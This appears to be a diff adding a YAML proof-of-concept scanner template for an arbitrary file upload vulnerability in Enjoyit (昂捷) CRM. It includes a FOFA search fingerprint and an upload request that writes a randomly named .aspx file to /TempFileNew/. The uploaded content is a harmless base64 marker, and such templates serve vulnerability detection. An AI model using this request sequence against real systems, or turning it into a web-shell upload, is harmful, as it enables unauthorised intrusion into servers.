@@ -1,0 +1,28 @@
+id: poc-yaml-enjoyit-crm-uploadfile-anyfile-upload
+info:
+  name: 昂捷CRM UploadFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 昂捷CRM
+  fofa: body="CheckSilverlightInstalled" && body="AllowHtmlPopupwindow"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /file/UploadFile?fileinfo={'UploadUserNo':'0000','LastChunk':true,'FileName':'{{.t1}}.aspx','IsUseMongdb':true,'UploadTime':'2025-06-18T12:11:56'}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{{.t2}}'
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"ObjectData\":") &&
+
+    !contains(body,"<")
+
+    '
+- method: GET
+  path: /TempFileNew/0000_202506181211560000_{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
